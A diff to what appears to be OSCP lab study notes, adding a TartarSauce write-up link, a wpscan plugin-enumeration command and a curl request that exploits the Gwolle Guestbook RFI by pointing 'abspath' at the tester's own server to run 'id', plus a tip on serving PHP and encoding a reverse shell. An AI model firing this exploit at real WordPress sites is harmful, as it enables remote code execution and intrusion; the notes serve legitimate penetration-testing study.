@@ -749,3 +749,25 @@ This page turns one repeatable part of an authorized assessment into a checklist
 - [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- demonstrates the workflow described here
 - [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- source archive review, upload-to-webshell execution, and asynchronous filename command injection
 - [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- custom PHP file parameter, LFI source review, and safe handling of encoded credential material
+- [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- robots/Gobuster triage, aggressive WPScan plugin discovery, and Gwolle RFI validation
+
+## WordPress plugin discovery and Gwolle RFI
+
+Use WordPress-aware enumeration when a WordPress path is confirmed:
+
+```bash
+wpscan --url "http://$BoxIP/webservices/wp/" \
+  --enumerate u,vp,vt --plugins-detection aggressive \
+  --output "$BoxDir/loot/wpscan-aggressive.txt"
+```
+
+For the Gwolle Guestbook `ajaxresponse.php` RFI, prove execution with a harmless command before sending a callback:
+
+```bash
+curl -sS -G \
+  "http://$BoxIP/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php" \
+  --data-urlencode "abspath=http://$LocalIP:8000/" \
+  --data-urlencode 'cmd=id'
+```
+
+Serve a minimal controlled PHP file with `python3 -m http.server`; base64-encode nested reverse-shell text if quoting becomes unreliable.
